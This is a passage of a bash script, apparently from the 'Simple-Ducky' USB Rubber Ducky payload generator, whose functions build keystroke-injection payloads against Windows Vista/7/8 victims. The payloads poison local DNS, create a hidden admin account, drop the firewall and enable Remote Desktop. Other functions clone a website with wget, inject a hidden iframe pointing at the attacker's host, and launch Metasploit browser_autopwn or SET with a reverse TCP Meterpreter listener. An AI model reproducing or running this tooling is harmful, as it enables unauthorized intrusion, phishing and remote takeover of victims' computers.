	echo -e "\e[1;34mDone!\e[0m"
	clear
	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
	echo ""
	sleep 2
	gnome-terminal -x se-toolkit &
	clear
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo "1) Social-Engineering Attacks"
	echo ""
	echo "2) Website Attack Vectors"
	echo ""
	echo "3) Java Applet Attack Method"
	echo ""
	echo "4) Site Cloner"
	echo ""
	echo "5) Are you using NAT/Port Forwarding [yes|no]: no"
	echo ""
	echo "6) IP address or hostname for the reverse connection: $attackerip"
	echo ""
	echo "7) Enter the url to clone: (Example: http://www.thisisafakesite.com)"
	echo ""
	echo "8) What payload do you want to generate: Windows Reverse_TCP Meterpreter"
	echo ""
	echo "9) Backdoored Executable (BEST)"
	echo ""
	echo "10) PORT of the listener [443]: $attackerport" 
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	nautilus /usr/share/ducky/encoder/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | SE-Toolkit w/o UAC (WIndows 8)
#################################################################################
f_setlocaldnsWIN8uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. In addition, it creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance. Couple this attack with the SE-Toolkit's website cloner and you will be unstoppable."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/setlocaldnsWIN8uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mStopping your webserver...\e[0m"
	echo ""
	sleep 2
	service apache2 stop
	clear
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	clear
	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
	echo ""
	sleep 2
	gnome-terminal -x se-toolkit &
	clear
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo "1) Social-Engineering Attacks"
	echo ""
	echo "2) Website Attack Vectors"
	echo ""
	echo "3) Java Applet Attack Method"
	echo ""
	echo "4) Site Cloner"
	echo ""
	echo "5) Are you using NAT/Port Forwarding [yes|no]: no"
	echo ""
	echo "6) IP address or hostname for the reverse connection: $attackerip"
	echo ""
	echo "7) Enter the url to clone: (Example: http://www.thisisafakesite.com)"
	echo ""
	echo "8) What payload do you want to generate: Windows Reverse_TCP Meterpreter"
	echo ""
	echo "9) Backdoored Executable (BEST)"
	echo ""
	echo "10) PORT of the listener [443]: $attackerport" 
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	nautilus /usr/share/ducky/encoder/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | SE-Toolkit w/UAC (Windows 8)
#################################################################################
f_setlocaldnsWIN8nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. In addition, it creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance. Couple this attack with the SE-Toolkit's website cloner and you will be unstoppable."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/setlocaldnsWIN8nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mStopping your webserver...\e[0m"
	echo ""
	sleep 2
	service apache2 stop
	clear
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	clear
	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
	echo ""
	sleep 2
	gnome-terminal -x se-toolkit &
	clear
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo "1) Social-Engineering Attacks"
	echo ""
	echo "2) Website Attack Vectors"
	echo ""
	echo "3) Java Applet Attack Method"
	echo ""
	echo "4) Site Cloner"
	echo ""
	echo "5) Are you using NAT/Port Forwarding [yes|no]: no"
	echo ""
	echo "6) IP address or hostname for the reverse connection: $attackerip"
	echo ""
	echo "7) Enter the url to clone: (Example: http://www.thisisafakesite.com)"
	echo ""
	echo "8) What payload do you want to generate: Windows Reverse_TCP Meterpreter"
	echo ""
	echo "9) Backdoored Executable (BEST)"
	echo ""
	echo "10) PORT of the listener [443]: $attackerport" 
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	nautilus /usr/share/ducky/encoder/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | Browser_Autopwn w/UAC (Win Vista/7)
#################################################################################
f_autopwnlocaldnsVIS7uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. This payload uses Metasploit's Browser_Autopwn Auxilary module along with an evil iframe to perform the attack. In addition to the DNS poisoning this attack; creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance."
	echo -e "\e[1;31mNote:\e[0m Not all websites like to be cloned using this method (wget)... Browser_autopwn is a finicky method to exploit browsers. If the victim's browser and computer are fully patched this method will likely fail."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	echo -e "\e[1;34mLet's start with the inject.bin file...\e[0m"
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/autopwnlocaldnsVIS7uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLet's clone a website...\e[0m"
	echo "" 
	read -p "What's the FQDN that you would like to clone (example: https://www.example.com)? " attackerfqdn
	echo -e ""
	clear
	rm index.html
	clear
	rm /var/www/index.html
	clear
	echo -e "\e[1;34mCloning $attackerfqdn and injecting an evil iframe...\e[0m"
	echo ""
	sleep 2
	wget $attackerfqdn
	echo "<iframe src="http://$attackerip:8080/duck" width="0" height="0">" >> index.html
	cp index.html /var/www/index.html
	rm index.html
	clear
	echo -e "\e[1;34mRestarting your Apache Server...\e[0m"
	echo ""
	sleep 2
	service apache2 restart
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	sleep 2
	clear
	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
	echo ""
	sleep 3
	gnome-terminal -x msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	nautilus /usr/share/ducky/encoder/ &
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | Browser_Autopwn w/o UAC (Win Vista/7)
#################################################################################
f_autopwnlocaldnsVIS7nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. This payload uses Metasploit's Browser_Autopwn Auxilary module along with an evil iframe to perform the attack. In addition to the DNS poisoning this attack; creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance."
	echo -e "\e[1;31mNote:\e[0m Not all websites like to be cloned using this method (wget)... Browser_autopwn is a finicky method to exploit browsers. If the victim's browser and computer are fully patched this method will likely fail."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	echo -e "\e[1;34mLet's start with the inject.bin file...\e[0m"
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/autopwnlocaldnsVIS7nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLet's clone a website...\e[0m"
	echo "" 
	read -p "What's the FQDN that you would like to clone (example: https://www.example.com)? " attackerfqdn
	echo -e ""
	clear
	rm index.html
	clear
	rm /var/www/index.html
	clear
	echo -e "\e[1;34mCloning $attackerfqdn and injecting an evil iframe...\e[0m"
	echo ""
	sleep 2
	wget $attackerfqdn
	echo "<iframe src="http://$attackerip:8080/duck" width="0" height="0">" >> index.html
	cp index.html /var/www/index.html
	rm index.html
	clear
	echo -e "\e[1;34mRestarting your Apache Server...\e[0m"
	echo ""
	sleep 2
	service apache2 restart
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	sleep 2
	clear
	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
	echo ""
	sleep 3
	gnome-terminal -x msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	nautilus /usr/share/ducky/encoder/ &
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | Browser_Autopwn w/UAC (Windows 8)
#################################################################################
f_autopwnlocaldnsWIN8uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. This payload uses Metasploit's Browser_Autopwn Auxilary module along with an evil iframe to perform the attack. In addition to the DNS poisoning this attack; creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance."
	echo -e "\e[1;31mNote:\e[0m Not all websites like to be cloned using this method (wget)... Browser_autopwn is a finicky method to exploit browsers. If the victim's browser and computer are fully patched this method will likely fail."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	echo -e "\e[1;34mLet's start with the inject.bin file...\e[0m"
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/autopwnlocaldnsWIN8uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLet's clone a website...\e[0m"
	echo "" 
	read -p "What's the FQDN that you would like to clone (example: https://www.example.com)? " attackerfqdn
	echo -e ""
	clear
	rm index.html
	clear
	rm /var/www/index.html
	clear
	echo -e "\e[1;34mCloning $attackerfqdn and injecting an evil iframe...\e[0m"
	echo ""
	sleep 2
	wget $attackerfqdn
	echo "<iframe src="http://$attackerip:8080/duck" width="0" height="0">" >> index.html
	cp index.html /var/www/index.html
	rm index.html
	clear
	echo -e "\e[1;34mRestarting your Apache Server...\e[0m"
	echo ""
	sleep 2
	service apache2 restart
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	sleep 2
	clear
	echo -e "\e[1;34mLaunching Metasploit's Browser_Autopwn auxilary module...\e[0m" 
	echo ""
	sleep 3
	gnome-terminal -x msfcli auxiliary/server/browser_autopwn LHOST=$attackerip LPORT=$attackerport SRVPORT=8080 SRVHOST=0.0.0.0 URIPATH=/duck E &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	nautilus /usr/share/ducky/encoder/ &
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | Browser_Autopwn w/o UAC (Windows 8)
#################################################################################
f_autopwnlocaldnsWIN8nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. This payload uses Metasploit's Browser_Autopwn Auxilary module along with an evil iframe to perform the attack. In addition to the DNS poisoning this attack; creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance."
	echo -e "\e[1;31mNote:\e[0m Not all websites like to be cloned using this method (wget)... Browser_autopwn is a finicky method to exploit browsers. If the victim's browser and computer are fully patched this method will likely fail."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	echo -e "\e[1;34mLet's start with the inject.bin file...\e[0m"
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/autopwnlocaldnsWIN8nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
